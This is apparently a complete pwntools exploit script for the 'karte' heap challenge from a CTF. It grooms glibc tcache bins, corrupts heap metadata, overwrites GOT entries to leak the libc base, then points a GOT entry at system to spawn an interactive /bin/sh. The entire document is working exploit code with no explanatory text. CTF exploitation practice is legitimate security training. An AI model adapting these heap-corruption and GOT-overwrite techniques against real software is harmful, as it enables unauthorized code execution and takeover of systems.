from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(size,c="A"):
	cmd(1)
	cmd(size)
	p.sendafter("> ",c)
	p.readuntil("id ")
	return int(p.readline(),10)
def free(idx):
	cmd(3)
	cmd(idx)
def edit(idx,c):
	cmd(4)
	cmd(idx)
	p.sendafter("> ",c)
def do_name(name):
	p.sendafter(".. ",name)
def rename(name):
	cmd(99)
	do_name(name)
	
context.log_level='debug'
context.arch='amd64'
address=0x0000000006021A0
p=process('./karte')
#p=remote("karte.chal.ctf.westerns.tokyo",10001)
do_name("It's n132!")
for x in range(7):
	tmp=add(0x18)#0
	free(tmp)
for x in range(7):
	tmp=add(0x68)#0
	free(tmp)
for x in range(7):
	tmp=add(0x78)#0
	free(tmp)
t1=add(0x78)
t2=add(0x78)
free(t2)
free(t1)
edit(t1,p64(address)[:3])
rename(flat(0,0x81))
t1=add(0x78)
t2=add(0x78,p64(0x21)*13+p64(0x21))
rename(p64(0x21)*2)
t3=add(0x410)
free(t2)
free(t3)
rename(flat(0,0x21,0,0x602118-5-0x10))
free(t1)
t1=add(0x18)
rename(flat(0,0x71))
free(t1)
rename(flat(0,0x71,0x602110))
add(0x68)
pay=p64(0x0000000400000041)+'\x00'*0x18
pay+=p64(0x13200000001)+p64(0x000000000602018)
pay+=p64(0)*2+p64(0x13300000001)+p64(0x000000000602078)
pay+=p64(0x0000deadc0bebeef)
add(0x68,pay)
edit(0x132,p64(0x000000000400710)[:6])
free(0x133)
base=u64(p.readline()[:-1].ljust(0x8,'\x00'))-(0x7ffff7a24680-0x7ffff79e4000)
log.warning(hex(base))
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
edit(0x133,p64(libc.sym['system']+base)[:6])
cmd("/bin/sh")
p.interactive()
